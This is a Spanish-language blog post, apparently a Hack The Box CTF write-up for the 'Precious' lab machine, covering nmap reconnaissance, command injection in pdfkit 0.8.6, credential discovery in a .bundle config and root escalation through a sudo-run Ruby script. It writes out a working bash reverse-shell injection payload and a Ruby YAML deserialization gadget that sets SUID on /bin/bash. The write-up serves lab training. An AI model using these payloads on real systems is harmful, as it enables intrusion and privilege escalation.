<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Precious Writeup" /><meta name="author" content="Miguel3023" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como root" /><meta property="og:description" content="En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como root" /><link rel="canonical" href="/posts/writeup-precious/" /><meta property="og:url" content="/posts/writeup-precious/" /><meta property="og:site_name" content="Miguel3023" /><meta property="og:image" content="/assets/img/commons/Precious/Precious.png" /><meta property="og:image:height" content="450" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-27T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/commons/Precious/Precious.png" /><meta property="twitter:title" content="Precious Writeup" /><meta name="twitter:site" content="@AngelMiguel3023" /><meta name="twitter:creator" content="@AngelMiguel3023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel3023","url":"https://miguel3023.github.io"},"dateModified":"2022-11-29T20:30:10-05:00","datePublished":"2022-11-27T00:00:00-05:00","description":"En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como root","headline":"Precious Writeup","image":{"width":800,"height":450,"url":"/assets/img/commons/Precious/Precious.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-precious/"},"url":"/posts/writeup-precious/"}</script><title>Precious Writeup | Miguel3023</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Miguel3023"><meta name="application-name" content="Miguel3023"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/sr.integra.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Miguel3023</a></div><div class="site-subtitle font-italic">CTF Player | Cybersecurity enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/miguel3023" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/AngelMiguel3023" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/907376" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/miguel-malag%C3%B3n-8547301b0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Precious Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Precious Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1669525200" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 27/11/2022 </em> </span> <span> Actualizado <em class="" data-ts="1669771810" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 29/11/2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 450'%3E%3C/svg%3E" data-src="../../assets/img/commons/Precious/Precious.png" class="preview-img bg" alt="Preview Image" width="800" height="450" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://miguel3023.github.io">Miguel3023</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="979 palabras"> <em>5 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como root</p><h2 id="reconocimiento"><span class="mr-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Primeramente realizamos un escaneo con nmap para detectar los puertos abiertos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ nmap -p- --min-rate 5000 --open -v -n -Pn 10.129.77.238 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:16 -05
Initiating SYN Stealth Scan at 16:16
Scanning 10.129.77.238 [65535 ports]
Discovered open port 80/tcp on 10.129.77.238
Discovered open port 22/tcp on 10.129.77.238
Completed SYN Stealth Scan at 16:16, 14.00s elapsed (65535 total ports)
Nmap scan report for 10.129.77.238
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</pre></table></code></div></div><p>Con <strong>whatweb</strong> podemos ver qué tecnologías emplea la web que hay en el puerto 80. Vemos que hay un redirec, entonces incluimos el dominio al <strong>/etc/hosts</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ whatweb http://10.129.77.238
http://10.129.77.238 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.77.238], 
RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]

http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], 
IP[10.129.77.238], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], 
X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
</pre></table></code></div></div><p>Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>❯ nmap -sCV -p22,80 10.129.77.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:27 -05
Nmap scan report for 10.129.77.238
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Si nos vamos a la web, podremos ver un convertidor de web a PDF. Si ponemos un servidor con python podemos ver que nos captura lo que tenemos en local y lo convierte a PDF, sin embargo si interceptamos la petición con <strong>BurpSuite</strong> en la respuesta veremos “Generated by pdfkit v0.8.6”</p><p><img data-src="/assets/img/commons/Precious/peticion.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Petición por Burp</em></p><h2 id="intrusión"><span class="mr-2">Intrusión</span><a href="#intrusión" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Si buscamos vulnerabilidades ante esa versión de <strong>pdfkit</strong> encontramos este <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">artículo</a> que nos dice cómo explotarla.</p><p>Si vemos en <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">MonkeyPentester</a> hay una forma de entablarnos una reverse shell con bash, sólo que en este caso le añadimos el <strong>bash -c</strong> para que nos lea el primer argumento y le hacemos la petición al localhost para que nos ejecute ese comando</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>localhost/?name=#{"%20`bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;tuip&gt;/&lt;puerto&gt; 0&gt;&amp;1'`"}
</pre></table></code></div></div><p>Antes de hacer lo anterior debimos estar en escucha con <strong>nc</strong> y obtendremos la shell</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.68] from (UNKNOWN) [10.129.77.238] 55796
bash: cannot set terminal process group (679): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ 

</pre></table></code></div></div><h2 id="privesc"><span class="mr-2">Privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Luego igualamos <strong>TERM</strong> a <strong>xterm</strong> para poder hacer control+L y nos limpie la pantalla</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ruby@precious:/var/www/pdfapp$ export TERM=xterm
</pre></table></code></div></div><p>Si nos vamos al directorio de <strong>Home</strong> de Ruby podemos ver un directorio “.bundle” oculto al cual si entramos y visualizamos el archivo de configuración encontramos las credenciales de Henry</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI*******"
ruby@precious:~/.bundle$ 
</pre></table></code></div></div><p>Una vez dentro podremos visualizar la flag de user</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>ruby@precious:~/.bundle$ su henry 
Password: 
henry@precious:/home/ruby/.bundle$ whoami
henry
henry@precious:/home/ruby/.bundle$ cat /home/henry/user.txt 
6b76013c67d712c4d671314833926bc7
henry@precious:/home/ruby/.bundle$
</pre></table></code></div></div><p>Vemos que tenemos permisos de sudoers</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$
</pre></table></code></div></div><p>Visualizamos el <strong>/opt/update_dependencies.rb</strong></p><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
<span class="nb">require</span> <span class="s2">"yaml"</span>
<span class="nb">require</span> <span class="s1">'rubygems'</span>

<span class="c1"># TODO: update versions automatically</span>
<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">list_from_file</span>
    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">list_local_gems</span>
    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
<span class="k">end</span>

<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>

<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
            <span class="k">else</span>
                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
            <span class="k">end</span>
        <span class="k">end</span>
    <span class="k">end</span>
<span class="k">end</span>
</pre></table></code></div></div><p>Es un script en Ruby y vemos que lee y ejecuta un archivo “dependencies.yml” el cual nosotros crearemos y meteremos un payload para escalar privilegios. Si buscamos por archivos yml payloads encontraremos un <a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">artículo</a> donde al final nos pone un repositorio en <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565">github</a>. Tomamos el segundo payload y lo modificamos para que nos dé permiso SUID en la <strong>/bin/bash</strong></p><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="o">---</span>
<span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Installer</span>
    <span class="ss">i: </span><span class="n">x</span>
<span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
    <span class="ss">i: </span><span class="n">y</span>
<span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Requirement</span>
  <span class="ss">requirements:
    </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span>
    <span class="ss">io: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">BufferedIO</span>
      <span class="ss">io: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span>
         <span class="ss">read: </span><span class="mi">0</span>
         <span class="ss">header: </span><span class="s2">"abc"</span>
      <span class="ss">debug_output: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
         <span class="ss">socket: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">RequestSet</span>
             <span class="ss">sets: </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
                 <span class="ss">socket: </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">module</span> <span class="s1">'Kernel'</span>
                 <span class="ss">method_id: :system</span>
             <span class="ss">git_set: </span><span class="s2">"chmod u+s /bin/bash"</span>
         <span class="ss">method_id: :resolve</span>
</pre></table></code></div></div><p>Le damos permisos de ejecución al “dependencies.yml”</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>henry@precious:~$ ls
dependencies.yml  user.txt
henry@precious:~$ chmod +x dependencies.yml
</pre></table></code></div></div><p>Luego ejecutamos con ruby el “/opt/update_dependencies.rb”</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
</pre></table></code></div></div><p>Listo, veremos que el “/bin/bash” tendrá permiso SUID y simplemente ponemos “bash -p” para convertirnos en root y visualizar la flag de root</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>henry@precious:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# cat root.txt 
9ac4d14553215cb0537bf66d7232f157
bash-5.1#
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/commandinjection/" class="post-tag no-text-decoration" >CommandInjection</a> <a href="/tags/sudoers/" class="post-tag no-text-decoration" >Sudoers</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Precious+Writeup+-+Miguel3023&url=%2Fposts%2Fwriteup-precious%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Precious+Writeup+-+Miguel3023&u=%2Fposts%2Fwriteup-precious%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fwriteup-precious%2F&text=Precious+Writeup+-+Miguel3023" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Writeup-Surveillance/">Surveillance Writeup</a><li><a href="/posts/writeup-broscience/">BroScience Writeup</a><li><a href="/posts/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a><li><a href="/posts/rbcd-attack/">Resource-Based Constrained Delegation Attack</a><li><a href="/posts/NoSQLI/">NoSQLI</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a 